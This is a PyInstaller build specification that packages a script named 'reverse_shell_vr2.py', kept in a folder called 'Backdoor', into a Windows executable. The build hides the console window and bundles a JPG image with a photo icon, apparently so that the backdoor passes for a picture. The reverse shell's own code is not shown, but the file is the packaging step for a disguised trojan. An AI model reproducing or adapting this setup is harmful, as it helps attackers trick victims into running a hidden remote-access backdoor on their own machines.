# -*- mode: python ; coding: utf-8 -*-

block_cipher = None


a = Analysis(['reverse_shell_vr2.py'],
             pathex=['C:\\Users\\Dan Amir\\Google Drive\\Coding\\Pyhton\\Backdoor'],
             binaries=[],
             datas=[('C:\\Users\\Dan Amir\\Desktop\\Shared\\5.jpg', '.')],
             hiddenimports=[],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher,
             noarchive=False)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          [],
          name='reverse_shell_vr2',
          debug=False,
          bootloader_ignore_signals=False,
          strip=False,
          upx=True,
          upx_exclude=[],
          runtime_tmpdir=None,
          console=False , icon='C:\\Users\\Dan Amir\\Desktop\\Shared\\photo.ico')
